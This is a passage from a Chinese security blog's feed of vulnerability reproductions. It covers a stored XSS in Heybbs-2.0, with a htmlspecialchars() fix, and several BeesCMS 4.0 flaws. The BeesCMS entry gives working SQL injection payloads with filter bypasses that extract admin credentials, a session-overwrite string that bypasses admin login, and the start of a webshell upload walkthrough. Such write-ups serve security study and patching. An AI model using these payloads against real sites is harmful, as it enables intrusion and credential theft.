data-original="https://img-blog.csdnimg.cn/20210120201435793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heybbs-2.0存储型XSS漏洞复现</title>
      <link href="/posts/ebc7c5d9.html"/>
      <url>/posts/ebc7c5d9.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>这个漏洞的成因主要是因为程序对用户的输入没有进行过滤而导致的</p></blockquote><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>漏洞出现在注册页面上，这里因为没有进行过滤，所以我们可以直接注册一个XSS语句，且每次访问index.php页面都会执行这个语句。</p><p>先来看一下/php/register.php的代码吧<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210127102424362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到，POST过来的username直接就赋值给了$username，下面的sql语句也是直接拼接进去的，连个单引号都没加</p><p>这个bbs系统怎么说呢，<strong>但凡有数据交互的地方，就有利用点……</strong></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>首先注册一个XSS语句的用户，直接就注册成功了……</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021012710252038.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>返回index.php，成功弹框：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210127102534352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>临时修复我采用的是htmlspecialchars() 进行简单过滤，先来看一下效果，这里为了体现加固效果，我把之前攻击的XSS测试语句先删除掉了</p><p>关键代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$lifeTime</span> <span class="token operator">=</span> <span class="token number">999</span> <span class="token operator">*</span> <span class="token number">3600</span><span class="token punctuation">;</span><span class="token function">session_set_cookie_params</span><span class="token punctuation">(</span><span class="token variable">$lifeTime</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#############################################################</span><span class="token shell-comment comment"># 进行htmlspecialchars()编码                                 #</span><span class="token shell-comment comment"># By：1匹黑马                                                #</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENT</span><span class="token punctuation">,</span><span class="token constant">QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">#</span><span class="token shell-comment comment">#############################################################</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$verify</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"verify"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$day</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">==</span><span class="token string">""</span> <span class="token keyword">or</span> <span class="token variable">$password</span><span class="token operator">==</span><span class="token string">"d41d8cd98f00b204e9800998ecf8427e"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('不能为空')&lt;/script>"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select id from user where username='$username' limit 1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$check</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$check</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('用户名已经存在')&lt;/script>"</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"verifyimg"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$verify</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"verify"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into user (username,password,day) values ('{$username}','{$password}','{$day}')"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$username</span><span class="token punctuation">;</span>      <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('注册成功',top.location='../login.php')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('验证码错误',top.location='../register.php')&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注册一个XSS语句账号：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210127102630358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问一下首页，看看是否还会弹窗</p><p>看来是不会了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021012710265372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到数据库里看一下，被处理成了什么样子：</p><p>还可，都给过滤掉了~<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210127102744778.png" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeesCMS4.0多处漏洞复现</title>
      <link href="/posts/e178bb2.html"/>
      <url>/posts/e178bb2.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本次复现的漏洞有：</p><ol><li>后台报错注入漏洞</li><li>变量覆盖漏洞</li><li>文件上传漏洞</li></ol><blockquote><p>Beescms v4.0由于后台登录设计缺陷以及代码防护缺陷导致存在bypass全局防护的SQL注入、文件上传、变量覆盖漏洞。现在依然有许多企业选用BeesCMS4.0，百度搜powerd by BEESCMS © 2010-2015 <a href="http://www.beescms.com" target="_blank" rel="noopener">www.beescms.com</a> 还是有很多站的：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020042009342779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="后台报错注入"><a href="#后台报错注入" class="headerlink" title="后台报错注入"></a>后台报错注入</h5><p>正常输入后台账号密码提示密码错误：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420100544259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420094355725.png" alt="在这里插入图片描述"></p><p>输入admin’报错，此处为显错注入：</p><pre class="line-numbers language-sql"><code class="language-sql">admin'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420112650852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用order by 10探测字段长度，最终探测长度为5</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">5</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420112906353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">6</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420113040165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>爆数据库名时and被过滤，采用空格+双写绕过：</p><pre class="line-numbers language-sql"><code class="language-sql">admin' an <span class="token operator">and</span> <span class="token number">d</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420114239672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420182825443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查表名时from、where、=被过滤：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420183857582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>依然采用空格+双写绕过：</p><pre class="line-numbers language-sql"><code class="language-sql">第一张表：<span class="token operator">-</span>admin<span class="token string">' an and d updatexml(1,concat(0x7e,(seselectlect table_name fr from om information_schema.tables wh where ere table_schema like '</span>bees' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420184516411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-sql"><code class="language-sql">第二章表：<span class="token operator">-</span>admin<span class="token string">' an and d updatexml(1,concat(0x7e,(seselectlect table_name fr from om information_schema.tables wh where ere table_schema like '</span>bees' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420184720564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>爆列名：</p><pre class="line-numbers language-sql"><code class="language-sql">列名<span class="token number">1</span>：admin<span class="token string">'a and nd updatexml(1,concat(0x7e,(seselectlect column_name fr from om information_schema.columns wh where ere table_name like '</span>bees_admin' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420191659796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-sql"><code class="language-sql">列名<span class="token number">2</span>：admin<span class="token string">'a and nd updatexml(1,concat(0x7e,(seselectlect column_name fr from om information_schema.columns wh where ere table_name like '</span>bees_admin' <span class="token keyword">limit</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020042019185872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>爆字段：</p><pre class="line-numbers language-sql"><code class="language-sql">字段<span class="token number">1</span>：admin'<span class="token number">a</span> <span class="token operator">and</span> nd updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>seselectlect admin_name fr <span class="token keyword">from</span> om bees<span class="token punctuation">.</span>bees_admin <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420192109887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre class="line-numbers language-sql"><code class="language-sql">字段<span class="token number">2</span>：admin'<span class="token number">a</span> <span class="token operator">and</span> nd updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>seselectlect admin_password fr <span class="token keyword">from</span> om bees<span class="token punctuation">.</span>bees_admin <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420192617925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h5 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h5><p>首先看一下后台的login.php，这里定义了f1_value()和f1_html()两个函数来进行过滤：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420192729546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这两个函数在fun.php文件中，跟进看一下这他们的内容：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420192740189.png" alt="在这里插入图片描述"><br>f1_value()对用户输入的字符串进行了比较严格的过滤，很多手注的关键字跟特殊符号都被过滤了，但也只是过滤一次，双写依然可以bypass。</p><p>f1_html()调用了htmlspecialchars()函数，它的作用是把特殊字符进行html实体转义，看似加了一道屏障，实则是加了一处隐患，这个函数虽然也转义’但是转义之后仍然是’，这样就造成了后台的一个报错注入：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420192811567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这样双写+f1_html漏洞就成功的让我们进行手注来拿后台账号密码了，后期要想写shell，只需要将shell内容进行Hex编码即可绕过htmlspecialchars()函数</p><h5 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h5><p>这里还有一个文件上传漏洞，我们看一下源码，我们上传的文件是经过is_uploaded_file()函数来检测的：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420192837902.png" alt="在这里插入图片描述"><br>跟进看一下，这里对文件type进行了白名单检测，所以我们只要修改一下Content-Type为image/jpg，即可绕过，下文我会继续复现此漏洞。</p><h5 id="Init-php"><a href="#Init-php" class="headerlink" title="Init.php"></a>Init.php</h5><p>这里存在一个变量覆盖，具体效果就是覆盖_SESSION来绕过后台登录验证，这里定义了一个is_login()函数来检测登录：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420193723568.png" alt="在这里插入图片描述"><br>跟进is_login()，也是在fun.php里：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420193736771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里只要_SESSION[login_in]=1并且_SESSION[admin]=1和_SESSION[login_time]&lt;3600就相当于你已经登录后台了，而它是先初始化变量，在进行登陆判断，又没有对http请求进行设置，所以导致前台POST覆盖变量直接登录后台。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420193754826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><h5 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h5><pre class="line-numbers language-php"><code class="language-php">Exp：<span class="token constant">_SESSION</span><span class="token punctuation">[</span>login_in<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>admin<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>login_time<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">99999999999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420194422472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">访问/admin成功绕过登陆验证：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420194322926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>这里在测试的时候出现了问题！虽然我修改了Content-Type，但是上传依然没有成功，我发现无论是.jpg还是.php，它的Content-Type都是multipart/form-data，于是我试了试先传一个图片，然后在修改后缀名，改为.php，结果竟然成功了！</p><p>先传一个图片马：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420194803769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功后修改后缀名突破上传：<br><img 